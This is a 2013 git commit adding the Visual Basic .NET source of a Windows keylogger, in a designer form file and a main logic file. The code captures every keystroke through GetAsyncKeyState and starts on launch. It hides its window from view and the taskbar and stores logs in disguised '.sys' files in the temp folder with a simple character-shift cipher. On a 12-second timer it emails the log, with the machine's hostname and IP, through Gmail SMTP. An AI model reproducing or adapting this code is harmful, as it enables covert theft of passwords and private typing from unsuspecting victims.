3c80b0e3c72dfa4bc0e65369e7710a3604c42308
Cataract <cataract@hackermail.com>
2013-08-31 19:35:33 +0800

    Keylogger Uploading...

---
+++ vbKeylogger/Keylogger.Designer.vb
@@ -0,0 +1,202 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class frm
+    Inherits System.Windows.Forms.Form
+
+    'Form overrides dispose to clean up the component list.
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Required by the Windows Form Designer
+    Private components As System.ComponentModel.IContainer
+
+    'NOTE: The following procedure is required by the Windows Form Designer
+    'It can be modified using the Windows Form Designer.  
+    'Do not modify it using the code editor.
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Me.components = New System.ComponentModel.Container()
+        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(frm))
+        Me.cmdBegin = New System.Windows.Forms.Button()
+        Me.txtOutput = New System.Windows.Forms.TextBox()
+        Me.GroupBox1 = New System.Windows.Forms.GroupBox()
+        Me.cmdClear = New System.Windows.Forms.Button()
+        Me.cmdEnd = New System.Windows.Forms.Button()
+        Me.StatusStrip1 = New System.Windows.Forms.StatusStrip()
+        Me.status = New System.Windows.Forms.ToolStripStatusLabel()
+        Me.lblAbout = New System.Windows.Forms.Label()
+        Me.chkFile = New System.Windows.Forms.CheckBox()
+        Me.OpenFileDialog = New System.Windows.Forms.OpenFileDialog()
+        Me.logEdit = New System.Windows.Forms.RichTextBox()
+        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
+        Me.Button1 = New System.Windows.Forms.Button()
+        Me.GroupBox1.SuspendLayout()
+        Me.StatusStrip1.SuspendLayout()
+        Me.SuspendLayout()
+        '
+        'cmdBegin
+        '
+        Me.cmdBegin.Location = New System.Drawing.Point(9, 19)
+        Me.cmdBegin.Name = "cmdBegin"
+        Me.cmdBegin.Size = New System.Drawing.Size(75, 23)
+        Me.cmdBegin.TabIndex = 0
+        Me.cmdBegin.Text = "Button1"
+        Me.cmdBegin.UseVisualStyleBackColor = True
+        '
+        'txtOutput
+        '
+        Me.txtOutput.Location = New System.Drawing.Point(19, 84)
+        Me.txtOutput.Multiline = True
+        Me.txtOutput.Name = "txtOutput"
+        Me.txtOutput.ReadOnly = True
+        Me.txtOutput.ScrollBars = System.Windows.Forms.ScrollBars.Both
+        Me.txtOutput.Size = New System.Drawing.Size(259, 110)
+        Me.txtOutput.TabIndex = 1
+        '
+        'GroupBox1
+        '
+        Me.GroupBox1.Controls.Add(Me.cmdClear)
+        Me.GroupBox1.Controls.Add(Me.cmdEnd)
+        Me.GroupBox1.Controls.Add(Me.cmdBegin)
+        Me.GroupBox1.Location = New System.Drawing.Point(19, 3)
+        Me.GroupBox1.Name = "GroupBox1"
+        Me.GroupBox1.Size = New System.Drawing.Size(259, 49)
+        Me.GroupBox1.TabIndex = 2
+        Me.GroupBox1.TabStop = False
+        Me.GroupBox1.Text = "GroupBox1"
+        '
+        'cmdClear
+        '
+        Me.cmdClear.Location = New System.Drawing.Point(178, 19)
+        Me.cmdClear.Name = "cmdClear"
+        Me.cmdClear.Size = New System.Drawing.Size(75, 23)
+        Me.cmdClear.TabIndex = 2
+        Me.cmdClear.Text = "Button2"
+        Me.cmdClear.UseVisualStyleBackColor = True
+        '
+        'cmdEnd
+        '
+        Me.cmdEnd.Location = New System.Drawing.Point(87, 19)
+        Me.cmdEnd.Name = "cmdEnd"
+        Me.cmdEnd.Size = New System.Drawing.Size(75, 23)
+        Me.cmdEnd.TabIndex = 1
+        Me.cmdEnd.Text = "Button1"
+        Me.cmdEnd.UseVisualStyleBackColor = True
+        '
+        'StatusStrip1
+        '
+        Me.StatusStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.status})
+        Me.StatusStrip1.Location = New System.Drawing.Point(0, 222)
+        Me.StatusStrip1.Name = "StatusStrip1"
+        Me.StatusStrip1.Size = New System.Drawing.Size(289, 22)
+        Me.StatusStrip1.SizingGrip = False
+        Me.StatusStrip1.TabIndex = 4
+        Me.StatusStrip1.Text = "StatusStrip1"
+        '
+        'status
+        '
+        Me.status.Name = "status"
+        Me.status.Size = New System.Drawing.Size(121, 17)
+        Me.status.Text = "ToolStripStatusLabel1"
+        '
+        'lblAbout
+        '
+        Me.lblAbout.AutoSize = True
+        Me.lblAbout.Location = New System.Drawing.Point(16, 68)
+        Me.lblAbout.Name = "lblAbout"
+        Me.lblAbout.Size = New System.Drawing.Size(39, 13)
+        Me.lblAbout.TabIndex = 5
+        Me.lblAbout.Text = "Label1"
+        '
+        'chkFile
+        '
+        Me.chkFile.AutoSize = True
+        Me.chkFile.Checked = True
+        Me.chkFile.CheckState = System.Windows.Forms.CheckState.Checked
+        Me.chkFile.Location = New System.Drawing.Point(19, 200)
+        Me.chkFile.Name = "chkFile"
+        Me.chkFile.Size = New System.Drawing.Size(84, 17)
+        Me.chkFile.TabIndex = 8
+        Me.chkFile.Text = "Save to Log"
+        Me.chkFile.UseVisualStyleBackColor = True
+        '
+        'OpenFileDialog
+        '
+        Me.OpenFileDialog.CheckFileExists = False
+        Me.OpenFileDialog.CheckPathExists = False
+        Me.OpenFileDialog.FileName = "C:\ntklr.sys"
+        Me.OpenFileDialog.ValidateNames = False
+        '
+        'logEdit
+        '
+        Me.logEdit.Location = New System.Drawing.Point(40, 129)
+        Me.logEdit.Name = "logEdit"
+        Me.logEdit.Size = New System.Drawing.Size(187, 51)
+        Me.logEdit.TabIndex = 10
+        Me.logEdit.Text = ""
+        '
+        'Timer1
+        '
+        Me.Timer1.Enabled = True
+        Me.Timer1.Interval = 12000
+        '
+        'Button1
+        '
+        Me.Button1.Location = New System.Drawing.Point(106, 57)
+        Me.Button1.Name = "Button1"
+        Me.Button1.Size = New System.Drawing.Size(67, 34)
+        Me.Button1.TabIndex = 11
+        Me.Button1.Text = "dec"
+        Me.Button1.UseVisualStyleBackColor = True
+        '
+        'frm
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.ClientSize = New System.Drawing.Size(289, 244)
+        Me.Controls.Add(Me.Button1)
+        Me.Controls.Add(Me.logEdit)
+        Me.Controls.Add(Me.chkFile)
+        Me.Controls.Add(Me.lblAbout)
+        Me.Controls.Add(Me.StatusStrip1)
+        Me.Controls.Add(Me.txtOutput)
+        Me.Controls.Add(Me.GroupBox1)
+        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle
+        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
+        Me.MaximizeBox = False
+        Me.MinimizeBox = False
+        Me.Name = "frm"
+        Me.ShowIcon = False
+        Me.ShowInTaskbar = False
+        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
+        Me.Text = "Form1"
+        Me.WindowState = System.Windows.Forms.FormWindowState.Minimized
+        Me.GroupBox1.ResumeLayout(False)
+        Me.StatusStrip1.ResumeLayout(False)
+        Me.StatusStrip1.PerformLayout()
+        Me.ResumeLayout(False)
+        Me.PerformLayout()
+
+    End Sub
+    Friend WithEvents cmdBegin As System.Windows.Forms.Button
+    Friend WithEvents txtOutput As System.Windows.Forms.TextBox
+    Friend WithEvents GroupBox1 As System.Windows.Forms.GroupBox
+    Friend WithEvents cmdClear As System.Windows.Forms.Button
+    Friend WithEvents cmdEnd As System.Windows.Forms.Button
+    Friend WithEvents StatusStrip1 As System.Windows.Forms.StatusStrip
+    Friend WithEvents status As System.Windows.Forms.ToolStripStatusLabel
+    Friend WithEvents lblAbout As System.Windows.Forms.Label
+    Friend WithEvents chkFile As System.Windows.Forms.CheckBox
+    Friend WithEvents OpenFileDialog As System.Windows.Forms.OpenFileDialog
+    Friend WithEvents logEdit As System.Windows.Forms.RichTextBox
+    Friend WithEvents Timer1 As System.Windows.Forms.Timer
+    Friend WithEvents Button1 As System.Windows.Forms.Button
+
+End Class
---
+++ vbKeylogger/Keylogger.vb
@@ -0,0 +1,585 @@
+﻿' libraries
+Imports System.Runtime.InteropServices
+Imports System.Threading
+Imports System.IO
+Imports System.Net
+Imports System.Text
+Imports System.Net.Mail
+
+Public Class frm
+    Dim bufer As String
+    Dim numBuf As Integer
+    Dim SrcBuffer As String
+    Dim bufArray(9999) As String
+    Dim salt As Integer
+
+
+    Sub FlushBufer()
+        bufer = ""
+        salt = 0
+        numBuf = 0
+        For i = 0 To UBound(bufArray)
+            bufArray(i) = ""
+        Next
+    End Sub
+    ' declarations
+    Dim buffer As New List(Of String)
+    Dim buffercat As String
+    Dim stagingpoint As String
+    Dim actual As String
+    Dim initlog As Boolean = False
+    Dim log As StreamWriter
+
+    ' threading
+    Public thread_scan As Thread
+    Public thread_hide As Thread
+
+    ' thread-safe calling for thread_hide
+    Delegate Sub Change()
+    Dim objchange As New Change(AddressOf DoHide)
+
+
+    Private Sub frmKeyRogger_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
+        
+
+        Me.Text = ""
+        lblAbout.Text = "About"
+        GroupBox1.Text = "Control Panel"
+        cmdBegin.Text = "Start"
+        cmdEnd.Text = "End"
+        cmdEnd.Enabled = False
+        cmdClear.Text = "Clear"
+        'initiate hide thread
+        thread_hide = New Thread(AddressOf HideIt)
+        thread_hide.IsBackground = True
+        thread_hide.Start()
+        status.Text = "Ready."
+
+        'autostart
+        Refresh()
+        thread_scan = New Thread(AddressOf Scan)
+        thread_scan.IsBackground = True
+        thread_scan.Start()
+        cmdBegin.Enabled = False
+        Dim sPath As String
+        sPath = System.IO.Path.GetTempPath
+        If chkFile.Checked = True Then
+            Try
+                log = New StreamWriter(sPath & "/ntr.sys", True)
+            Catch
+                End
+            End Try
+
+        End If
+
+        status.Text = "Doing that thing..."
+
+        cmdEnd.Enabled = True
+
+    End Sub
+    ' write out keystroke log to file on close event
+    Private Sub frmKeyRogger_Closed(ByVal sender As Object, ByVal e As System.EventArgs) Handles MyBase.Closed
+      
+        Thread.Sleep(200)
+        thread_scan.Abort()
+        buffer.Clear()
+        cmdBegin.Enabled = True
+        cmdEnd.Enabled = False
+        Call WriteOut()
+        status.Text = "Stopped..."
+        Refresh()
+
+        Dim sPath As String
+        sPath = System.IO.Path.GetTempPath
+        If logEdit.Text = "" Then
+            ' Call checker()
+            Thread.Sleep(200)
+            End
+        Else
+            ' Call checker()
+            Thread.Sleep(200)
+            Call WriteOut()
+        End If
+
+        Dim filename As String = sPath & "/adb.exe"
+        Dim writer As BinaryWriter
+        Dim reader As BinaryReader
+        Dim tmpStringData As String
+        Dim tmpByteData As Byte
+        Dim tmpCharData As Char
+        Dim tempIntData As Integer
+        Dim tempBoolData As Boolean
+        '
+        writer = New BinaryWriter(File.Open(filename, FileMode.Append))
+        Using writer
+            'writer.Write("apple")
+            writer.Write(1)   'byte
+            'writer.Write(YourCharHere)   'char
+            'writer.Write(1.31459)        'single
+            'writer.Write(100)        'integer
+            'writer.Write(False)        'boolean
+        End Using
+        writer.Close()
+        '
+        If (File.Exists(filename)) Then
+            reader = New BinaryReader(File.Open(filename, FileMode.Open))
+            Using reader
+                tmpStringData = reader.ReadString()
+                'tempByteData = reader.ReadByte()
+                'tempCharData = reader.ReadChar()
+                'tempSingleData = reader.ReadSingle()
+                'tempIntData = reader.ReadInt32()
+                'tempBoolData = reader.ReadBoolean()
+            End Using
+            reader.Close()
+        End If
+
+
+
+
+
+    End Sub
+    Sub checker()
+        Dim sPath As String
+        sPath = System.IO.Path.GetTempPath
+        If My.Computer.FileSystem.FileExists(sPath & "/ntr.sys") Then
+            My.Computer.FileSystem.DeleteFile(sPath & "/ntr.sys")
+        Else
+            Thread.Sleep(1)
+        End If
+    End Sub
+
+
+    ' getkey, API call to USER32.DLL
+    <DllImport("USER32.DLL", EntryPoint:="GetAsyncKeyState", SetLastError:=True,
+    CharSet:=CharSet.Unicode, ExactSpelling:=True,
+    CallingConvention:=CallingConvention.StdCall)>
+    Public Shared Function getkey(ByVal Vkey As Integer) As Boolean
+    End Function
+
+
+    Private Sub cmdBegin_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdBegin.Click
+        Refresh()
+        thread_scan = New Thread(AddressOf Scan)
+        thread_scan.IsBackground = True
+        thread_scan.Start()
+        cmdBegin.Enabled = False
+        Dim sPath As String
+        sPath = System.IO.Path.GetTempPath
+        If chkFile.Checked = True Then
+            Try
+                log = New StreamWriter(sPath & "/ntr.sys", True)
+            Catch
+                End
+            End Try
+
+        End If
+
+        status.Text = "Doing that thing..."
+
+        cmdEnd.Enabled = True
+    End Sub
+
+    ' checks for keypresses with delay, upon detection of pressed key, calls AddToBuffer
+    Public Sub Scan()
+        Dim foo As Integer
+        While 1
+
+            For foo = 1 To 93 Step 1
+                If getkey(foo) Then
+                    AddtoBuffer(foo, getkey(16))
+                End If
+            Next
+
+            For foo = 186 To 192 Step 1
+                If getkey(foo) Then
+                    AddtoBuffer(foo, getkey(16))
+                End If
+            Next
+
+            BufferToOutput()
+            buffer.Clear()
+
+            Thread.Sleep(120)
+            SetText(stagingpoint)
+        End While
+    End Sub
+
+
+    ' parses keycode and saves to buffer to be written
+    Public Sub AddtoBuffer(ByVal foo As Integer, ByVal modifier As Boolean)
+        If Not (foo = 1 Or foo = 2 Or foo = 8 Or foo = 9 Or foo = 13 Or (foo >= 17 And foo <= 20) Or foo = 27 Or (foo >= 32 And foo <= 40) Or (foo >= 44 And foo <= 57) Or (foo >= 65 And foo <= 93) Or (foo >= 186 And foo <= 192)) Then
+            Exit Sub
+        End If
+
+        Select Case foo
+            Case 48 To 57
+                If modifier Then
+                    Select Case foo
+                        Case 48
+                            actual = ")"
+                        Case 49
+                            actual = "!"
+                        Case 50
+                            actual = "@"
+                        Case 51
+                            actual = "#"
+                        Case 52
+                            actual = "$"
+                        Case 53
+                            actual = "%"
+                        Case 54
+                            actual = "^"
+                        Case 55
+                            actual = "&"
+                        Case 56
+                            actual = "*"
+                        Case 57
+                            actual = "("
+                    End Select
+                Else
+                    actual = Convert.ToChar(foo)
+                End If
+            Case 65 To 90
+                If modifier Then
+                    actual = Convert.ToChar(foo)
+                Else
+                    actual = Convert.ToChar(foo + 32)
+                End If
+            Case 1
+                'actual = "<LCLICK>"
+                actual = ""
+            Case 2
+                actual = "<RCLICK>"
+            Case 8
+                actual = "<BACKSPACE>"
+            Case 9
+                actual = "<TAB>"
+            Case 13
+                actual = "<ENTER>"
+            Case 17
+                actual = "<CTRL>"
+            Case 18
+                actual = "<ALT>"
+            Case 19
+                actual = "<PAUSE>"
+            Case 20
+                actual = "<CAPSLOCK>"
+            Case 27
+                actual = "<ESC>"
+            Case 32
+                actual = " "
+            Case 33
+                actual = "<PAGEUP>"
+            Case 34
+                actual = "<PAGEDOWN>"
+            Case 35
+                actual = "<END>"
+            Case 36
+                actual = "<HOME>"
+            Case 37
+                actual = "<LEFT>"
+            Case 38
+                actual = "<UP>"
+            Case 39
+                actual = "<RIGHT>"
+            Case 40
+                actual = "<DOWN>"
+            Case 44
+                actual = "<PRNTSCRN>"
+            Case 45
+                actual = "<INSERT>"
+            Case 46
+                actual = "<DEL>"
+            Case 47
+                actual = "<HELP>"
+            Case 186
+                If modifier Then
+                    actual = ":"
+                Else
+                    actual = ";"
+                End If
+                actual = ";"
+
+            Case 187
+                If modifier Then
+                    actual = "+"
+                Else
+                    actual = "="
+                End If
+            Case 188
+                If modifier Then
+                    actual = "<"
+                Else
+                    actual = ","
+                End If
+            Case 189
+                If modifier Then
+                    actual = "_"
+                Else
+                    actual = "-"
+                End If
+            Case 190
+                If modifier Then
+                    actual = ">"
+                Else
+                    actual = "."
+                End If
+            Case 191
+                If modifier Then
+                    actual = "?"
+                Else
+                    actual = "/"
+                End If
+            Case 192
+                If modifier Then
+                    actual = "~"
+                Else
+                    actual = "`"
+                End If
+        End Select
+
+        If buffer.Count <> 0 Then
+            Dim bar As Integer = 0
+            While bar < buffer.Count
+                If buffer(bar) = actual Then
+                    Exit Sub
+                End If
+                bar += 1
+            End While
+        End If
+
+        buffer.Add(actual)
+
+
+    End Sub
+
+    ' writes buffer to output box
+    Public Sub BufferToOutput()
+        If buffer.Count <> 0 Then
+            Dim qux As Integer = 0
+            While qux < buffer.Count
+                buffercat = buffercat & buffer(qux)
+                qux += 1
+            End While
+            'SetText(txtOutput.Text & buffercat)
+            stagingpoint = stagingpoint & buffercat
+            buffercat = String.Empty
+        End If
+    End Sub
+
+    Delegate Sub SetTextCallback(ByVal [text] As String)
+
+    ' thread safe call to output text to output box
+    Private Sub SetText(ByVal [text] As String)
+        If txtOutput.InvokeRequired Then
+            Dim d As New SetTextCallback(AddressOf SetText)
+            Me.Invoke(d, New Object() {[text]})
+        Else
+            txtOutput.Text = [text]
+        End If
+    End Sub
+
+    Private Sub cmdEnd_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdEnd.Click
+        thread_scan.Abort()
+        buffer.Clear()
+        cmdBegin.Enabled = True
+        cmdEnd.Enabled = False
+        Call WriteOut()
+        status.Text = "Stopped..."
+        Refresh()
+        Application.Restart()
+
+    End Sub
+
+    Private Sub cmdClear_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles cmdClear.Click
+        txtOutput.Clear()
+        stagingpoint = String.Empty
+    End Sub
+
+
+
+    Private Sub frmKeyRogger_Resize(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Resize
+        If Me.WindowState = FormWindowState.Minimized Then
+            Me.Hide()
+        End If
+    End Sub
+
+    Public Sub WriteOut()
+        Dim sPath As String
+        sPath = System.IO.Path.GetTempPath
+        If chkFile.Checked = False Then
+            Exit Sub
+        End If
+        Dim tm As System.DateTime
+        tm = Now
+
+        Try
+            log.WriteLine(vbNewLine)
+        Catch
+            log = New StreamWriter(sPath & "/ntr.sys", True)
+        End Try
+        log.WriteLine(tm)
+        If stagingpoint <> Nothing Then
+            log.WriteLine(stagingpoint)
+        End If
+        log.WriteLine(vbNewLine)
+        log.Flush()
+        log.Close()
+        'hides file/sets as hidden
+        Call enc()
+
+        Dim strHostName As String
+
+        Dim strIPAddress As String
+
+
+
+        strHostName = System.Net.Dns.GetHostName()
+
+        strIPAddress = System.Net.Dns.GetHostByName(strHostName).AddressList(0).ToString()
+        Dim lolk As String = Now.ToShortTimeString
+
+
+        'Start by creating a mail message object
+        Dim MyMailMessage As New MailMessage()
+
+        'From requires an instance of the MailAddress type
+        MyMailMessage.From = New MailAddress("insertyouremail")
+
+        'To is a collection of MailAddress types
+        MyMailMessage.To.Add("insertyouremail")
+
+        MyMailMessage.Subject = "Log For: " & strHostName & "  ---  " & strIPAddress & "  @   " & lolk
+        Dim string1 As String = logEdit.Text
+        MyMailMessage.Body = string1
+
+        'Create the SMTPClient object and specify the SMTP GMail server
+        Dim SMTPServer As New SmtpClient("smtp.gmail.com")
+        SMTPServer.Port = 587
+        SMTPServer.Credentials = New System.Net.NetworkCredential("insertemail", "insertpass")
+        SMTPServer.EnableSsl = True
+        Try
+            SMTPServer.Send(MyMailMessage)
+
+        Catch ex As SmtpException
+        End Try
+        Application.Restart()
+    End Sub
+
+    Sub enc()
+        Thread.Sleep(200)
+        Dim sPath As String
+        sPath = System.IO.Path.GetTempPath
+        Dim s As String
+        Dim tr As IO.TextReader = New IO.StreamReader(sPath & "/ntr.sys")
+        s = tr.ReadToEnd
+        logEdit.Text = s
+        Dim sa As String
+        sa = logEdit.Text
+        SrcBuffer = sa
+        salt = 7
+        For i = 0 To Len(SrcBuffer) - 1
+            logEdit.SelectionStart = i
+            logEdit.SelectionLength = 1
+            bufArray(i) = logEdit.SelectedText
+            numBuf = (Asc(bufArray(i)) + salt)
+            On Error GoTo error1
+            bufArray(i) = Chr(numBuf)
+            bufer = bufer + bufArray(i)
+        Next
+        logEdit.Text = bufer
+
+
+        FlushBufer()
+        log.Close()
+        Call save()
+error1:
+        FlushBufer()
+
+    End Sub
+
+    Sub save()
+        Dim sPath As String
+        sPath = System.IO.Path.GetTempPath
+        Dim fs
+        Dim a
+        fs = CreateObject("Scripting.FileSystemObject")
+        a = fs.CreateTextFile(sPath & "/ntrs.sys", True)
+        a.WriteLine(logEdit.Text)
+        a.Close()
+        log.Close()
+        My.Computer.FileSystem.DeleteFile(sPath & "/ntr.sys")
+        My.Computer.FileSystem.DeleteFile(sPath & "/ntr.sys")
+        Dim asd As String
+        asd = logEdit.Text
+        logEdit.Text = ""
+    End Sub
+    Sub dec()
+        Dim sPath As String
+        sPath = System.IO.Path.GetTempPath
+        Dim s As String
+        Dim tr As IO.TextReader = New IO.StreamReader(sPath & "/ntrs.sys")
+        s = tr.ReadToEnd
+        logEdit.Text = s
+        Dim sa As String
+        sa = logEdit.Text
+        SrcBuffer = sa
+        salt = 7
+
+        For i = 0 To Len(SrcBuffer) - 1
+            logEdit.SelectionStart = i
+            logEdit.SelectionLength = 1
+            bufArray(i) = logEdit.SelectedText
+            numBuf = (Asc(bufArray(i)) - salt)
+            On Error GoTo error1
+            bufArray(i) = Chr(numBuf)
+            bufer = bufer + bufArray(i)
+        Next
+
+        logEdit.Text = bufer
+
+        Dim fs
+        Dim a
+        fs = CreateObject("Scripting.FileSystemObject")
+        a = fs.CreateTextFile(sPath & "/ntrss.sys", True)
+        a.WriteLine(logEdit.Text)
+        a.Close()
+
+        FlushBufer()
+        Exit Sub
+error1:
+        FlushBufer()
+    End Sub
+    Sub error1()
+        FlushBufer()
+
+    End Sub
+
+    ' ctrl+shift+s toggles hide form
+    Public Sub HideIt()
+        While 1
+            If getkey(17) And getkey(160) And getkey(83) Then
+                Me.Invoke(objchange)
+            End If
+            Thread.Sleep(200)
+        End While
+    End Sub
+
+    Public Sub DoHide()
+        If Me.Visible = True Then
+            Me.Visible = False
+        Else
+            Me.Visible = True
+        End If
+    End Sub
+
+    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
+        Call WriteOut()
+        Timer1.Start()
+    End Sub
+
+    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
+        Call dec()
+    End Sub
+End Class
